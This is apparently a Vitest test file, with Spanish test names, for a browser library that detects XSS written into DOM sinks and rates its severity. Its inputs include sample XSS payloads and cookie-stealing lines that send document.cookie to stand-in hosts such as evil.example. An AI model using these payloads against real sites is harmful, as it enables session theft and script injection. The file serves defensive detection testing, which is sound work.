import { afterEach, describe, expect, it } from "vitest";
import { BrowserGuard } from "../src/BrowserGuard";
import { RiskEngine } from "../src/Core/RiskEngine";
import { XssSinkDetector } from "../src/Detectors/XssSinkDetector";
import type { SecurityEvent, SinkData } from "../src/Types/SecurityEvent";
import type { SecurityFinding } from "../src/Types/SecurityFinding";
import {
  AnalyzeAttribute,
  AnalyzeCode,
  AnalyzeMarkup,
  MaxAnalyzedLength,
  SuspiciousUrlValues,
} from "../src/Utils/MarkupIndicators";
import { FlushMicrotasks, ResetGuard } from "./Helpers";

const Page = "https://app.example.com/search";

describe("MarkupIndicators", () => {
  it("ignora texto y HTML sin estructura ejecutable", () => {
    expect(AnalyzeMarkup("hola mundo", Page)).toBeNull();
    expect(AnalyzeMarkup("<b>hola</b><ul><li>a</li></ul>", Page)).toBeNull();
    expect(AnalyzeMarkup("<p>alert(1) en texto</p>", Page)).toBeNull();
    expect(AnalyzeMarkup("<a", Page)).toBeNull();
  });

  it("distingue handlers automáticos de handlers con interacción", () => {
    expect(AnalyzeMarkup('<img src=x onerror="alert(1)">', Page)).toEqual([
      "auto-event-handler",
      "probe",
    ]);
    expect(AnalyzeMarkup("<svg/onload=alert`1`>", Page)).toEqual(["auto-event-handler", "probe"]);
    expect(AnalyzeMarkup('<button onclick="save()">Guardar</button>', Page)).toEqual([
      "event-handler",
    ]);
  });

  it("detecta script, javascript: (también ofuscado) y contenido embebido", () => {
    expect(AnalyzeMarkup("<script>steal()</script>", Page)).toEqual(["script-tag"]);
    expect(AnalyzeMarkup('<a href="javascript:steal()">x</a>', Page)).toEqual(["javascript-url"]);
    expect(AnalyzeMarkup('<a href="&#106;avascript:steal()">x</a>', Page)).toEqual([
      "javascript-url",
    ]);
    expect(AnalyzeMarkup('<iframe srcdoc="<b>x</b>"></iframe>', Page)).toEqual([
      "embedded-content",
    ]);
    expect(AnalyzeMarkup('<base href="https://evil.example/">', Page)).toEqual([
      "embedded-content",
    ]);
  });

  it("javascript:void(0) y javascript:; son inofensivos", () => {
    expect(AnalyzeMarkup('<a href="javascript:void(0)">x</a>', Page)).toBeNull();
    expect(AnalyzeMarkup("<a href='javascript:;'>x</a>", Page)).toBeNull();
    expect(AnalyzeMarkup('<a href="javascript:">x</a>', Page)).toBeNull();
  });

  it("detecta acceso a datos sensibles junto a estructura ejecutable", () => {
    expect(
      AnalyzeMarkup("<img src=x onerror=\"fetch('//evil.example?c='+document.cookie)\">", Page),
    ).toEqual(["auto-event-handler", "sensitive-access"]);
  });

  it("detecta contenido reflejado desde la URL (XSS reflejado en el DOM)", () => {
    const payload = '<img src=x onerror="alert(1)">';
    const href = `${Page}?q=${encodeURIComponent(payload)}#tab=1`;
    expect(AnalyzeMarkup(`<div>Resultados para ${payload}</div>`, href)).toContain("url-reflected");
    // El mismo HTML sin relación con la URL no se marca como reflejado.
    expect(AnalyzeMarkup(`<div>${payload}</div>`, Page)).not.toContain("url-reflected");
  });

  it("extrae valores sospechosos de query y hash, y los cachea", () => {
    const href = `${Page}?safe=hello&q=%3Cscript%3E#frag=%22onload%3Dx&bad=%E0%A4%A`;
    const values = SuspiciousUrlValues(href);
    expect(values).toContain("<script>");
    expect(values).toContain('"onload=x');
    expect(values).not.toContain("hello");
    expect(SuspiciousUrlValues(href)).toBe(values);
    expect(SuspiciousUrlValues(null)).toEqual([]);
  });

  it("limita la longitud analizada", () => {
    const padding = "a".repeat(MaxAnalyzedLength);
    expect(AnalyzeMarkup(`<b>${padding}</b><script>x</script>`, Page)).toBeNull();
  });

  it("código como string siempre es un indicador", () => {
    expect(AnalyzeCode("doSomething()", Page)).toEqual(["string-code"]);
    expect(AnalyzeCode("new Image().src='//e.example?'+document.cookie", Page)).toEqual([
      "string-code",
      "sensitive-access",
    ]);
  });

  it("atributos peligrosos asignados con setAttribute", () => {
    expect(AnalyzeAttribute("onclick", "go()", Page)).toEqual(["event-handler"]);
    expect(AnalyzeAttribute("ONERROR", "alert(1)", Page)).toEqual(["auto-event-handler", "probe"]);
    expect(AnalyzeAttribute("href", "javascript:steal()", Page)).toEqual(["javascript-url"]);
    expect(AnalyzeAttribute("href", "javascript:void(0)", Page)).toBeNull();
    expect(AnalyzeAttribute("srcdoc", "<script>x</script>", Page)).toEqual(["script-tag"]);
    expect(AnalyzeAttribute("class", "onerror=alert(1)", Page)).toBeNull();
    expect(AnalyzeAttribute("on", "x", Page)).toBeNull();
  });
});

describe("XssSinkDetector", () => {
  function Evaluate(data: Partial<SinkData>): SecurityFinding | null {
    const event: SecurityEvent<SinkData> = {
      Id: "evt-1",
      Timestamp: 1,
      Type: "dom.sink",
      Source: "Test",
      Data: { Sink: "innerHTML", Target: "div", Length: 40, Indicators: [], ...data },
    };
    const candidate = new XssSinkDetector().Analyze(event);
    return candidate ? new RiskEngine({}, "info").Evaluate(candidate, event) : null;
  }

  it("payload clásico (onerror + alert) → high", () => {
    const finding = Evaluate({ Indicators: ["auto-event-handler", "probe"] });
    expect(finding).toMatchObject({
      Category: "xss",
      Severity: "high",
      Title: "Dangerous content written to innerHTML",
    });
    expect(finding?.Description).toContain("on <div>");
    expect(finding?.Evidence).toEqual({
      Sink: "innerHTML",
      Target: "div",
      Length: 40,
      Indicators: ["auto-event-handler", "probe"],
    });
  });

  it("reflejado desde la URL → critical", () => {
    expect(
      Evaluate({ Indicators: ["auto-event-handler", "probe", "url-reflected"] })?.Severity,
    ).toBe("critical");
  });

  it("handler inline con interacción → low", () => {
    expect(Evaluate({ Indicators: ["event-handler"] })?.Severity).toBe("low");
  });

  it("document.write suma riesgo por ser un sink obsoleto", () => {
    const finding = Evaluate({ Sink: "document.write", Target: null, Indicators: ["script-tag"] });
    expect(finding?.Signals).toEqual(["xss.script-tag", "xss.legacy-sink"]);
    expect(finding?.Severity).toBe("medium");
  });

  it("código como string con acceso a cookies → high", () => {
    const finding = Evaluate({
      Sink: "setTimeout",
      Target: null,
      Indicators: ["string-code", "sensitive-access"],
    });
    expect(finding?.Title).toBe("Code string passed to setTimeout");
    expect(finding?.Severity).toBe("high");
  });

  it("indicadores desconocidos se ignoran", () => {
    expect(Evaluate({ Indicators: ["unknown"] })).toBeNull();
  });
});

describe("SinkMonitor integrado", () => {
  const Quiet = {
    Console: "silent",
    Preset: "development",
    Monitors: {
      Fetch: false,
      Xhr: false,
      WebSocket: false,
      Dom: false,
      Csp: false,
      Prototype: false,
      Runtime: false,
    },
  } as const;

  afterEach(() => {
    ResetGuard();
    document.body.innerHTML = "";
  });

  async function XssFindings(guard: BrowserGuard): Promise<SecurityFinding[]> {
    await FlushMicrotasks();
    return guard.GetReport().Findings.filter((finding) => finding.Category === "xss");
  }

  function RenderComment(target: Element, html: string): void {
    target.innerHTML = html;
  }

  it("detecta innerHTML peligroso, conserva el comportamiento y captura el stack", async () => {
    const guard = BrowserGuard.Start(Quiet);
    const container = document.createElement("div");
    RenderComment(container, '<img src="x" onerror="alert(1)">');

    expect(container.querySelector("img")?.getAttribute("onerror")).toBe("alert(1)");
    expect(container.innerHTML).toBe('<img src="x" onerror="alert(1)">');
    const [finding] = await XssFindings(guard);
    expect(finding).toMatchObject({
      Severity: "high",
      Title: "Dangerous content written to innerHTML",
    });
    expect(finding?.Stack).toContain("RenderComment");
    expect(JSON.stringify(finding)).not.toContain("onerror=");
  });

  it("HTML inofensivo y valores no string no generan hallazgos", async () => {
    const guard = BrowserGuard.Start(Quiet);
    const container = document.createElement("div");
    container.innerHTML = "<ul><li>uno</li><li>dos</li></ul>";
    (container as unknown as { innerHTML: unknown }).innerHTML = 42;
    expect(container.textContent).toBe("42");
    expect(await XssFindings(guard)).toEqual([]);
  });

  it("observa outerHTML, insertAdjacentHTML, createContextualFragment, document.write y setAttribute", async () => {
    const guard = BrowserGuard.Start(Quiet);
    const host = document.createElement("section");
    const child = document.createElement("p");
    host.appendChild(child);
    child.outerHTML = "<script>steal()</script>";
    host.insertAdjacentHTML("beforeend", '<a href="javascript:steal()">x</a>');
    document.createRange().createContextualFragment("<svg onload=alert(1)>");
    const other = document.implementation.createHTMLDocument("x");
    // Se usa document.write a propósito: es uno de los sinks que se verifican.
    // eslint-disable-next-line @typescript-eslint/no-deprecated
    other.write("<iframe src=//evil.example></iframe>");
    const link = document.createElement("a");
    link.setAttribute("href", "javascript:steal()");
    link.setAttribute("class", "safe");

    const sinks = (await XssFindings(guard)).map((finding) => (finding.Evidence as SinkData).Sink);
    expect(sinks).toEqual([
      "outerHTML",
      "insertAdjacentHTML",
      "createContextualFragment",
      "document.write",
      "setAttribute",
    ]);
    expect(link.getAttribute("href")).toBe("javascript:steal()");
  });

  it("agrupa escrituras equivalentes repetidas (bucles de renderizado)", async () => {
    const guard = BrowserGuard.Start(Quiet);
    const container = document.createElement("div");
    for (let i = 0; i < 50; i++) {
      container.innerHTML = `<button onclick="select(${i})">${i}</button>`;
    }
    const other = document.createElement("span");
    other.innerHTML = '<button onclick="x()">x</button>';
    expect(await XssFindings(guard)).toHaveLength(2);
  });

  it("Stop restaura los setters y métodos originales", () => {
    const innerHTML = Object.getOwnPropertyDescriptor(Element.prototype, "innerHTML");
    const setAttribute = Element.prototype.setAttribute;
    const guard = BrowserGuard.Start(Quiet);
    expect(Object.getOwnPropertyDescriptor(Element.prototype, "innerHTML")?.set).not.toBe(
      innerHTML?.set,
    );
    guard.Stop();
    expect(Object.getOwnPropertyDescriptor(Element.prototype, "innerHTML")).toEqual(innerHTML);
    expect(Element.prototype.setAttribute).toBe(setAttribute);
  });

  it("Monitors.Sinks: false no intercepta nada", () => {
    const innerHTML = Object.getOwnPropertyDescriptor(Element.prototype, "innerHTML");
    BrowserGuard.Start({ ...Quiet, Monitors: { ...Quiet.Monitors, Sinks: false } });
    expect(Object.getOwnPropertyDescriptor(Element.prototype, "innerHTML")).toEqual(innerHTML);
  });
});
